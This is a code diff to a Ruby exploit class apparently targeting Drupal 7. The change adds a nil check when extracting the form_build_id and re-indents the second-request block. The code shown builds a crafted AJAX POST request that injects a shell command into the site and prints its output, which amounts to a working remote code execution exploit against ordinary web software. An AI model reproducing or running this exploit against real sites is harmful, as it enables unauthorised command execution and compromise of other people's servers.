@@ -83,7 +83,8 @@ class Drupal7 < Target
 	def get_form_build_id(response)
 		page = Nokogiri::HTML(response)
 		form = page.css('form#user-pass')
-		return /<input type="hidden" name="form_build_id" value="([^"]+)"/.match(form.to_s)[1]
+		# returns either a new string (if a match is found) or nil
+		return form.to_s[/name="form_build_id" value="([^"]+)"/, 1]
 	end
 
 	def exploit
@@ -113,31 +114,36 @@ class Drupal7 < Target
 		puts response.code
 		
 		form_build_id = get_form_build_id(response.body)
-  		
+
+		if form_build_id
 	  	puts "[*] Obtained build id!: #{form_build_id}"
 
   		post_parameters = "form_build_id=#{form_build_id}"
 
-  		#
-  		# => Second Request
-  		#
-		req = Net::HTTP::Post.new(URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}"))
-		puts "Requesting: " + @uri.host + URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}")
-		puts "POST: " + post_parameters
-		req.body = post_parameters
 
-		response = @http.request(req)
+			#
+			# => Second Request
+			#
+			req = Net::HTTP::Post.new(URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}"))
+			puts "Requesting: " + @uri.host + URI.encode("#{@uri.path}#{form2}/ajax/name/#value/#{form_build_id}")
+			puts "POST: " + post_parameters
+			req.body = post_parameters
 
-		puts "Response code: " + response.code
-		
-		if response.body.split('[{"command"')[0] == ""
-			if(@command != 'id')
-				failed("Maybe incorrect input command, try simple command as 'id'")
+			response = @http.request(req)
+
+			puts "Response code: " + response.code
+
+			if response.body.split('[{"command"')[0] == ""
+				if(@command != 'id')
+					failed("Maybe incorrect input command, try simple command as 'id'")
+				end
+					failed("")
 			end
-				failed("")
+
+			puts response.body.split('[{"command"')[0]
+		else
+			puts '[!] Could not find form build ID.'
 		end
-		
-		puts response.body.split('[{"command"')[0]
 	end
 end
 
